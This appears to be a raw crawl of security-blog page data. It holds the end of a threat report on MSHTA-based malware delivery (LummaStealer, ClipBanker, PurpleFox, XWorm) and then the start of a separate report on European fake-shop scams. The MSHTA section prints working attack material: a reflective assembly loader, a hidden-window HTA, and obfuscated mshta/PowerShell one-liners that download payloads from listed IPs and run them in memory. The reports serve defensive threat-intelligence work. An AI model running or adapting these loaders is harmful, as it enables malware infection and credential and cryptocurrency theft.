manually reversing it is almost impossible. However, with script block logging and some tooling, we can reconstruct the final layer of script that was executed.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"394\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-8.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe final, deobfuscated version of the PowerShell script consists of two parts. The first one is an AMSI bypass by patching clr.dll, possibly taken from a publicly available GitHub repository [4]. After the AMSI bypass, there is a big Base64-encoded string, followed by three lines of code that decode the Base64 and load the resulting byte array as an assembly.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E$bytes = [System.Convert]::FromBase64String($a);\n[Reflection.Assembly]$assembly = [System.AppDomain]::CurrentDomain.Load($bytes) # Load Assembly\n$assembly.EntryPoint.Invoke($null, @())\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis loader is most often used to execute commodity malware on the infected system. In the case we analyzed, the assembly that was executed is a well-known LummaStealer assembly (1E0E375F3EE82D5AF5DFE6F7DF0E2FAC9A7D37C67ADD3390D05A93AFD85B7C84) that contains C2 domains associated with the Lumma infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-9.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"472\" height=\"476\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"clipbanker\"\u003EClipBanker\u003C\u002Fh2\u003E\u003Cp\u003EAnother MSHTA-driven cluster in our telemetry involved ClipBanker [8], a malware family primarily designed to steal cryptocurrency by replacing wallet addresses in the victim’s clipboard. In this infection chain, MSHTA serves as an early-stage execution mechanism that launches a remote HTA and then quickly transitions to PowerShell-based persistence and payload delivery.\u003C\u002Fp\u003E\u003Cp\u003EThe HTA executed from the remote location hxxps[:\u002F\u002F]asd[.]s7610rir[.]pw\u002Fwin\u002Fchecking[.]hta is a simple script that hides the MSHTA window by moving it to negative coordinates, creates a Wscript Shell object and runs a Base64-encoded PowerShell command.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E&lt;HTML&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\u002Fhtml; charset=utf-8\"&gt;\n&lt;HEAD&gt;\n&lt;script language=\"VBScript\"&gt;\n        Window.ReSizeTo 0, 0\n        Window.moveTo -2000,-2000\n        Function var_func()\n                Dim var_shell\n                Set var_shell = CreateObject(\"Wscript.Shell\")\n                var_shell.run \"cmd \u002Fc powershell.exe -w 1 -NoProfile -InputFormat None -ExecutionPolicy Bypass -e &lt;redacted_b64_command&gt;, 0, true\n        End Function\n\n        var_func\n&lt;\u002Fscript&gt;\n&lt;body&gt;\n&lt;\u002Fbody&gt;\n&lt;\u002FHEAD&gt;\n&lt;\u002FHTML&gt;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe command downloads the second stage from hxxp[:\u002F\u002F]185[.]208[.]159[.]199, which is a Powershell file called checking.ps1 (333E2192F2551415659FB4094E81B911708921BB588EECF65E27F51C9938DFC2). \u003C\u002Fp\u003E\u003Cp\u003EThe role of this script is to ensure Windows Defender exclusions and persistence, which executes the ClipBanker downloader obtained from: hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fichigo-lite[.]ps1 (38FE562136ADE372FC4CEDDE67826AEEA8404E93A54A4A4736DDB4C8C8D4C96D).\u003C\u002Fp\u003E\u003Cp\u003EThe scheduled task names masquerade as services that sound legitimate (e.g., Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237).\u003C\u002Fp\u003E\u003Cp\u003EFinally, a cleanup script gets executed, downloaded from hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fdel[.]ps1 (7D0487AFC91B0FE8B2FBF732AB54C3C07E86BF69471BBA6C283AABEA190499BA). \u003C\u002Fp\u003E\u003Cp\u003EThis script cleans up the files used during the attack and terminates processes that might have been involved in dynamic analysis in a sandbox (e.g., Procmon, Autoruns).\u003C\u002Fp\u003E\u003Ch2 id=\"purplefoxeven-sophisticated-threats-use-mshta\"\u003EPurpleFox - even sophisticated threats use MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EMSHTA is not only used in commodity-stealing and loader campaigns. It also appears in delivery chains associated with PurpleFox [9], a more advanced and persistent malware family that has remained active for years.\u003C\u002Fp\u003E\u003Cp\u003EThis is important because it shows that MSHTA is useful not only for lightweight initial infection stages, but also for malware operations focused on stealth, persistence, and long-term control of the compromised system.\u003C\u002Fp\u003E\u003Cp\u003ESince emerging in 2018, PurpleFox has continued to expand its arsenal and remains active in 2026. One of its long-standing delivery methods, however, has remained consistent: launching msiexec from an MSHTA command line in order to download and execute an MSI package disguised as a .png file.\u003C\u002Fp\u003E\u003Cp\u003EThe command lines are recognizable by the list of IP addresses they attempt to contact and by the .png file that is ultimately executed through msiexec:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe vbscript:createobject(\"wscript.shell\").run(\"Cmd \u002Fc for \u002Fd %i in (195[.]189[.]28[.]244:17807 103[.]124[.]106[.]194:18413 58[.]221[.]59[.]20:17256 ) do Msiexec \u002Fi http:\u002F\u002F%i\u002F3EBCE3A4.Png \u002FQ\",0)(window.close)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EOnce installed, PurpleFox functions as a rootkit-enabled backdoor whose primary objectives are to remain hidden, establish persistence, and execute on-demand commands from its C2 infrastructure. \u003C\u002Fp\u003E\u003Cp\u003EThese capabilities can support a wide range of malicious activity, including information theft, surveillance, and disruptive actions such as DDoS attacks.\u003C\u002Fp\u003E\u003Ch2 id=\"mshta-and-powershellan-intermediary-step-in-multi-stage-attacks\"\u003EMSHTA and PowerShell - an intermediary step in multi-stage attacks\u003C\u002Fh2\u003E\u003Cp\u003EOur telemetry shows multiple smaller clusters of PowerShell executions via MSHTA, where MSHTA creates a wscript shell that runs the PowerShell process to execute the loader responsible for downloading the next stage.\u003C\u002Fp\u003E\u003Cp\u003EWe observed obfuscation techniques unique to each campaign, aiming to mask keywords that trigger alerts in EDRs and SIEMs.\u003C\u002Fp\u003E\u003Cp\u003EThe first category features URLs that appear to link to image files but actually contain a PowerShell script downloaded and executed in memory. These IPs are typically used by XWorm\u002FDanabot. PowerShell keywords are split into multiple tokens to bypass detection.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $L='(New-Object Net.We';$Y='bClient).Downlo';$V='adString(''http:\u002F\u002F92[.]255[.]57[.]155\u002Fb.jpg'')';$F=I`E`X ($L,$Y,$V -Join '')|I`E`X\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EA variation of the XWorm command line adds junk characters, which are removed by the String.Replace method.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell IEX(('#!!i!Qw#Q!r #8###5#.!!!2###0!!8#.8###4!!.2!!!0###8!\u002F#x!!!.j###pg# |#i!!e!!!!x#').RePlACE('Q','').REplAcE('!','').rEpLAce('#',''))\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe next category involves the Lalala information stealer, where the script is delivered only if the POST request to the PHP script includes a predefined password. Other PowerShell keywords remain unobfuscated.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell Invoke-Expression -Command:(iwr -uri 185[.]156[.]172[.]22\u002Fgate990.php -method post -body gieM3iR5).content\"\", 0 : window.close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAnother cluster of PowerShell commands executes scripts previously downloaded in the chain. This delivery method is noisier because it allows scanning the script file for malware.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -ep bypass -File \"\"\"\"C:\\Users\\U_f8d33485bec26b2b1969f910c131f027\\AppData\\Roaming\\Adobe\\peyneKzk2.ps1 \"\"\"\"\"\" ,0:close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe final major category involves command lines where the URL is encoded and stored in local variables. The one-liner decodes the URL and executes the downloaded payload in memory.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $Z='aXdyIGh0dHBzOi8vMHg0NC5pbmZvL2F8aWV4';$B=[System.Convert]::FromBase64String($Z);$D=[System.Text.Encoding]::UTF8.GetString($B);iex $D\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"driverpackan-example-of-legitimate-usage\"\u003EDriverPack - an example of legitimate usage\u003C\u002Fh2\u003E\u003Cp\u003ENot every MSHTA execution we observed was clearly malicious. A significant portion of detections came from DriverPack's update mechanism, an older software package that downloads driver files from third-party sources rather than through official Microsoft update channels.\u003C\u002Fp\u003E\u003Cp\u003EAlthough DriverPack is not inherently malicious, many security vendors classify some of its components as potentially unwanted applications (PUA).\u003C\u002Fp\u003E\u003Cp\u003EIn the cases we analyzed, DriverPack used a scheduled task to launch mshta.exe, which then executed an HTA in memory to check for updates or ensure that the latest version of the software was installed.\u003C\u002Fp\u003E\u003Cp\u003EWhile this appears to serve a legitimate software-maintenance purpose, the method is unorthodox and overlaps with techniques commonly used in malicious delivery chains.\u003C\u002Fp\u003E\u003Cp\u003EThis is an important reminder that MSHTA usage is not automatically malicious. At the same time, using MSHTA to retrieve and execute remote content as part of an update workflow is not a recommended design choice, especially when more modern and transparent alternatives are available.\u003C\u002Fp\u003E\u003Ch2 id=\"recommended-user-and-organizational-mitigations\"\u003ERecommended user and organizational mitigations\u003C\u002Fh2\u003E\u003Cp\u003EDefense against MSHTA-related attacks generally falls into two broad categories: user awareness and behavior, and the implementation of technical security controls.\u003C\u002Fp\u003E\u003Cp\u003EMany of the attack chains presented in this article rely on user interaction. In some cases, users are persuaded to download software or media from untrusted websites that promise free or cracked content. In others, they are manipulated through social engineering into willingly executing malicious commands copied to the clipboard. For this reason, user education remains an important line of defense.\u003C\u002Fp\u003E\u003Cp\u003EUsers should be informed about these tactics and regularly reminded of the risks associated with downloading untrusted files, following suspicious instructions, or executing commands they do not fully understand.\u003C\u002Fp\u003E\u003Cp\u003ETechnical mitigations are equally important. MSHTA-based attacks usually do not rely on a single malicious file, but on a chain of script execution, command-line abuse, in-memory stages, and follow-on payload delivery. That is why protection needs to cover multiple points in the attack chain, from attack surface reduction to pre-execution detection and runtime behavioral blocking.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender employs various technologies to detect these attacks as part of its layered defense strategy, all of which are integrated into Bitdefender’s security solutions.\u003C\u002Fp\u003E\u003Cp\u003EUntil Microsoft removes legacy scripting utilities that are still present by default in Windows, users can reduce exposure by ensuring that they run a comprehensive security solution, such as \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Fultimate-security\"\u003E\u003Cstrong\u003EBitdefender Ultimate Security\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003Cstrong\u003E.\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAdditionally, \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fbusiness\u002Fproducts\u002Fthreat-intelligence-solutions?_gl=1*b2kr29*_ga*MTQzMDAyODk0LjE3NzAxOTcwMjY.*_ga_6M0GWNLLWF*czE3Nzc5NjM5Nzkkbzc5JGcxJHQxNzc3OTYzOTg5JGo1MCRsMCRoODc0MzM4NjE5*_gcl_aw*R0NMLjE3NzY0MzAyMTguQ2p3S0NBand0SWZQQmhBekVpd0F2OVJUSnJPRHFwNDJEZmtGLS1CMG9wOWFIRXM3X3dWbTJzeFdMX0tDb010ZnhqSHdEdHNEU25vZkhSb0NYTXNRQXZEX0J3RQ..*_gcl_au*MjAxNjczMTk1OC4xNzc2MjQzODYw*FPAU*MjAxNjczMTk1OC4xNzc2MjQzODYw\" rel=\"noopener noreferrer\"\u003E\u003Cstrong\u003EBitdefender Threat Intelligence Solutions\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E help organizations detect, investigate, and respond to cyber threats faster by providing real-time intelligence on malicious files, URLs, domains, and IPs. Delivered through feeds, APIs, and the IntelliZone portal, the solutions support both security teams and security vendors with actionable threat data, contextual insights, and automated integrations for stronger cybersecurity operations.\u003C\u002Fp\u003E\u003Cp\u003EIn environments where they are no longer required for legitimate workflows, binaries such as wscript.exe and mshta.exe should be Established 2001.","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002Fbdlabs_logo_orig-3.png","#15171A","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002F600x200.jpeg","bitdefender","@bitdefenderlabs","Europe\u002FIstanbul","Home","\u002Ftag\u002Fantimalware-research\u002F","\u002Ftag\u002Ffree-tools\u002F","\u002Ftag\u002Fwhitepapers\u002F","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002Ftwitter-card.jpeg","noreply","icon-and-text","Subscribe","free","monthly","off","hotforsecurity@bitdefender.com","noreply@blogapp.bitdefender.com","visibility","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002F","5.101",{},"fr","\u003Cp\u003ECybercriminals are scaling fake online stores into a coordinated multinational business.\u003C\u002Fp\u003E\u003Cp\u003EA Bitdefender Labs investigation identified more than 55 fake-shop campaigns targeting consumers across 12 European countries between March and May 2026. The campaigns mimicked some of the world’s most recognizable brands, including Samsung, Nike, Adidas, ZARA, H&amp;M, Amazon, Lidl, and SHEIN.\u003C\u002Fp\u003E\u003Cp\u003EAttackers used Facebook ads, WhatsApp messages, email campaigns, SMS messages, phone calls and fraudulent websites to lure victims into making payments, sharing personal information or buying fake goods.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender researchers mapped more than 40 domains associated with these operations and observed repeat tactics that linked campaigns across multiple countries. Some operators relied on rotating domains and misleading redirects. Others built counterfeit supply chains through WhatsApp and password-protected catalogs. Several campaigns exploited anticipation surrounding the 2026 FIFA World Cup.\u003C\u002Fp\u003E\u003Cp\u003EThe findings show that fake-shop operations have evolved far beyond isolated scam websites. Many now resemble professional e-commerce businesses with advertising budgets, localization strategies and infrastructure designed to evade detection.\u003C\u002Fp\u003E\u003Ch2 id=\"key-takeaways\"\u003EKey takeaways\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EResearchers identified more than 55 confirmed fake-shop campaigns targeting consumers across Europe.\u003C\u002Fli\u003E\n\u003Cli\u003EAttackers impersonated Samsung, Nike, Adidas, ZARA, H&amp;M, Amazon, Lidl, SHEIN and other major brands.\u003C\u002Fli\u003E\n\u003Cli\u003ESocial media ads and WhatsApp emerged as the most-abused channels.\u003C\u002Fli\u003E\n\u003Cli\u003ESeveral campaigns exploited FIFA World Cup 2026 excitement.\u003C\u002Fli\u003E\n\u003Cli\u003EOperators reused infrastructure across countries and brands.\u003C\u002Fli\u003E\n\u003Cli\u003ERedirect chains, Unicode lookalike domains, domain rotation, and localized content helped attackers evade detection.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"by-the-numbers\"\u003EBy the numbers\u003C\u002Fh2\u003E\u003Cblockquote\u003E\n\u003Cul\u003E\n\u003Cli\u003E55+ confirmed fake-shop campaigns.\u003C\u002Fli\u003E\n\u003Cli\u003E15+ impersonated brands.\u003C\u002Fli\u003E\n\u003Cli\u003E12 European countries targeted.\u003C\u002Fli\u003E\n\u003Cli\u003E40+ fake domains mapped.\u003C\u002Fli\u003E\n\u003Cli\u003E6 attack channels observed.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fblockquote\u003E\n\u003Cp\u003EThe investigation tracked coordinated campaigns operating between \u003Cstrong\u003EMarch and May 2026\u003C\u002Fstrong\u003E across social media platforms, WhatsApp, email, SMS, phone calls, and fraudulent e-commerce websites.\u003C\u002Fp\u003E\u003Ch2 id=\"fake-shop-campaigns-spread-across-europe\"\u003EFake-shop campaigns spread across Europe\u003C\u002Fh2\u003E\u003Cp\u003EBitdefender security researchers have observed confirmed activity across the EU and the United Kingdom, including Germany, France, Italy, Poland, Spain, the Netherlands, Sweden, Portugal, Austria, Ireland and Romania.\u003C\u002Fp\u003E\u003Cp\u003EThe campaigns appeared on multiple channels:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003ESocial media advertisements\u003C\u002Fli\u003E\n\u003Cli\u003EWhatsApp messages\u003C\u002Fli\u003E\n\u003Cli\u003EEmail campaigns\u003C\u002Fli\u003E\n\u003Cli\u003ESMS campaigns\u003C\u002Fli\u003E\n\u003Cli\u003EPhone calls\u003C\u002Fli\u003E\n\u003Cli\u003EDedicated fake e-commerce websites\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003ERather than relying on a single fraudulent storefront, many operators rotated domains, changed brands, and adapted messaging to local audiences.\u003C\u002Fp\u003E\u003Ch2 id=\"social-media-ads-impersonate-trusted-brands\"\u003ESocial media ads impersonate trusted brands\u003C\u002Fh2\u003E\u003Ch3 id=\"samsung-galaxy-s26-ultra-offered-at-90-discounts\"\u003ESamsung Galaxy S26 Ultra offered at 90% discounts\u003C\u002Fh3\u003E\u003Cp\u003EOne campaign promoted Samsung Galaxy S26 Ultra devices for only €249 while advertising discounts of up to 90%.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F06\u002Fsamsung.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"468\" height=\"468\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe operation targeted German consumers through Facebook advertisements and used domains such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Eshopintertec[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.zppzddw[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.fjjfxxz[.]shop\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EResearchers found a mix of unrelated advertising personas promoting the same fraudulent offer. The campaign generated substantial engagement, including hundreds of thousands of ad views.\u003C\u002Fp\u003E\u003Cp\u003EResearchers also saw a Netherlands-based variant that abused KPN branding. According to the investigation, ads promised Samsung-related offers through what appeared to be KPN-affiliated promotions, then redirected users to the fraudulent storefront crowndistrictstore[.]com.\u003C\u002Fp\u003E\u003Ch3 id=\"zara-and-nike-campaigns-shared-the-same-infrastructure\"\u003EZARA and Nike campaigns shared the same infrastructure\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also identified a Polish hub operating through notcia[.]shop that impersonated both ZARA and Nike.\u003C\u002Fp\u003E\u003Cp\u003EThe ZARA campaign advertised Italian fashion products and seasonal collections while directing shoppers to fake storefronts at the same time. The Nike campaign promoted apparel and requested detailed delivery information, including home addresses and postal codes.\u003C\u002Fp\u003E\u003Cp\u003EResearchers also linked related domains to the operation, including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Enebularaless[.]info\u003C\u002Fli\u003E\n\u003Cli\u003Eshryxla-mynx[.]icu\u003C\u002Fli\u003E\n\u003Cli\u003Eisblkx[.]shop\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EBoth campaigns used the same domain, notcia.shop, and the same advertising identity, suggesting an operational link between the ZARA and Nike impersonation activities. The Nike campaign also requested detailed delivery information, including house numbers and postal codes.\u003C\u002Fp\u003E\u003Cp\u003EMoreover, these campaigns seek to gather personal information from their targets. The website states the following (translated from Polish):\u003C\u002Fp\u003E\u003Cblockquote\u003E\n\u003Cp\u003E“Please provide your exact delivery address (including street address, house number, and postal code), otherwise we cannot guarantee product delivery! Thank you for your cooperation! Processing time: Ships within 48-72 hours of payment. Money-back guarantee.”\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"fake-hm-sales-targeted-italian-shoppers\"\u003EFake H&amp;M sales targeted Italian shoppers\u003C\u002Fh3\u003E\u003Cp\u003EAnother campaign promoted heavily discounted clothing through cyberloria[.]cfd.\u003C\u002Fp\u003E\u003Cp\u003EThis operation primarily targeted consumers in Italy and used Facebook advertisements that imitated legitimate H&amp;M promotions. Attackers exploited brand recognition and discount claims to drive traffic toward a suspicious domain unrelated to the actual retailer.\u003C\u002Fp\u003E\u003Ch2 id=\"whatsapp-becomes-a-counterfeit-marketplace\"\u003EWhatsApp becomes a counterfeit marketplace\u003C\u002Fh2\u003E\u003Ch3 id=\"the-%E2%80%9Csupplier-carl%E2%80%9D-counterfeit-network\"\u003EThe “Supplier Carl” counterfeit network\u003C\u002Fh3\u003E\u003Cp\u003EBitdefender researchers also uncovered a China-based operator calling himself “Carl” who contacted European users through WhatsApp. The messages promoted “1:1 quality” counterfeit products, including Nike, Adidas, Jordan, Golden Goose, various watches, luxury accessories and much more.\u003C\u002Fp\u003E\u003Cp\u003EVictims were directed toward password-protected Yupoo catalogs, including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ecarl-album.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eadidas555.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Egolden-goose.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Exy666999.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe messages indicated that the operator offers DHL shipping to Europe and researchers observed the same infrastructure being promoted to users in Germany, France, and Italy.\u003C\u002Fp\u003E\u003Cp\u003EHere is an example of such a message (original text): \u003C\u002Fp\u003E\u003Cblockquote\u003E\n\u003Cp\u003E“Nice to meet you, my name is Carl, I am a supplier from China. I specialize in 1:1 quality, I have shoes, clothes, bags, belts, watches, sunglasses and other products. About shipping. The express delivery for European countries is DHL, the shipping time is about 7-12 days. The express delivery for other countries is FedEx and the shipping time is 7 days. Here are some of my yupoo products. Please click to view. If you like the item, please send me a picture and I will tell you the price.”\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"adidas-world-cup-fan-kit-scams\"\u003EAdidas World Cup Fan-Kit scams\u003C\u002Fh3\u003E\u003Cp\u003EAnother campaign targeted German users with messages promising free Adidas Deutschland 2026 Fan Kits.\u003C\u002Fp\u003E\u003Cp\u003EThe operation distributed thousands of WhatsApp messages and relied on redirect infrastructure such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Elinkrdr[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Erewardpillar[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Edealgo[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Eofferpilot[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Emsgdeal[.]cc\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe campaign exploited enthusiasm for the FIFA World Cup to convince recipients that they had won exclusive promotional merchandise.\u003C\u002Fp\u003E\u003Ch3 id=\"unicode-lookalike-domains-bypass-traditional-checks\"\u003EUnicode lookalike domains bypass traditional checks\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also identified campaigns that abused visually deceptive domains—a surprisingly common tactic. Not everyone checks the actual URLs of the websites they open, and attackers know this all too well.\u003C\u002Fp\u003E\u003Cp\u003EExamples included:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Eadidȧs[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eṇike[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eniḳe[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Erołex[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese domains appeared legitimate to human users while remaining technically different from authentic brand domains. The campaigns typically promised free shoes, watches, coupons, or anniversary gifts.\u003C\u002Fp\u003E\u003Ch2 id=\"email-sms-and-phone-scams-expand-the-ecosystem\"\u003EEmail, SMS, and phone scams expand the ecosystem\u003C\u002Fh2\u003E\u003Ch3 id=\"shein-themed-email-campaigns\"\u003ESHEIN-themed email campaigns\u003C\u002Fh3\u003E\u003Cp\u003ESecurity researchers also identified a large-scale email operation impersonating SHEIN order-confirmation messages.\u003C\u002Fp\u003E\u003Cp\u003EThe campaign relied on domains including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Esheinnotice[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Esheinemail[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe attackers tried to make the messages look authentic through localized European content and retailer-themed branding. One unusual indicator involved legal documentation hosted on Google Drive rather than official websites.\u003C\u002Fp\u003E\u003Ch3 id=\"counterfeit-world-cup-merchandise-stores\"\u003ECounterfeit World Cup merchandise stores\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also observed counterfeit merchandise campaigns exploiting FIFA World Cup 2026 interest.\u003C\u002Fp\u003E\u003Cp\u003EAssociated domains included:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Efootballiscrazy[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eunitedfutballjersey[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Ekicksfireshoes.com[.]co\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe operators promoted jerseys and football merchandise through email and SMS campaigns targeting European fans.\u003C\u002Fp\u003E\u003Ch3 id=\"amazon-clone-sites-and-subscription-traps\"\u003EAmazon clone sites and subscription traps\u003C\u002Fh3\u003E\u003Cp\u003EAmazon branding emerged as one of the most frequently observed in terms of impersonation attempts during the investigation.\u003C\u002Fp\u003E\u003Cp\u003EResearchers identified:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Efeasino[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eamazon-clone-*.vercel[.]app\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese operations seemed to be designed to exploit consumer trust in the Amazon brand to collect payment information and potentially enroll users in unwanted subscription schemes.\u003C\u002Fp\u003E\u003Ch2 id=\"established-fake-shop-networks-continue-operating\"\u003EEstablished fake-shop networks continue operating\u003C\u002Fh2\u003E\u003Ch3 id=\"homborg-online-handel-runs-a-rotating-network-of-german-fake-shops\"\u003EHomborg Online Handel runs a rotating network of German fake shops\u003C\u002Fh3\u003E\u003Cp\u003EOne of the most mature operations identified during the investigation was a network operating under variations of the name “Homborg Online Handel.” \u003C\u002Fp\u003E\u003Cp\u003EThe German consumer protection association \u003Ca href=\"https:\u002F\u002Fverbraucherschutz.de\u002F\"\u003EVerbraucherschutz Deutschland online e.V.\u003C\u002Fa\u003E has published warnings about the operation, which reportedly runs multiple professional-looking online stores that target shoppers with attractive pricing and what look like legitimate checkout experiences.\u003C\u002Fp\u003E\u003Cp\u003EAccording to the investigation, the storefronts advertise multiple payment options, including card payments and PayPal, but ultimately accept only SEPA advance bank transfers during checkout. Because bank transfers offer limited recourse once funds are sent, victims face serious challenges recovering their money.\u003C\u002Fp\u003E\u003Cp\u003EResearchers observed a pattern of rapid domain rotation. When one domain is removed or blocked, another appears shortly afterward. As of May 2026, the network included domains such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ealpinvolt[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ekaimoro[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ehavro[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ekavri[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Eheyomi[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Enorya[.]de\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThis extensive operation shows how fake-shop networks increasingly resemble legitimate e-commerce businesses, complete with professional storefronts, customer-service workflows, and infrastructure designed to survive enforcement efforts.\u003C\u002Fp\u003E\u003Ch3 id=\"romanian-fake-order-calls\"\u003ERomanian fake-order calls\u003C\u002Fh3\u003E\u003Cp\u003EAnother operation relied on telephone calls. Victims received calls claiming they had already placed an online order. Attackers pressured recipients to confirm purchases, provide personal information, or complete payments for products they never requested.\u003C\u002Fp\u003E\u003Cp\u003EThe products varied widely, from fashion items to health supplements and household goods.\u003C\u002Fp\u003E\u003Ch3 id=\"lidl-themed-fake-shops\"\u003ELidl-themed fake 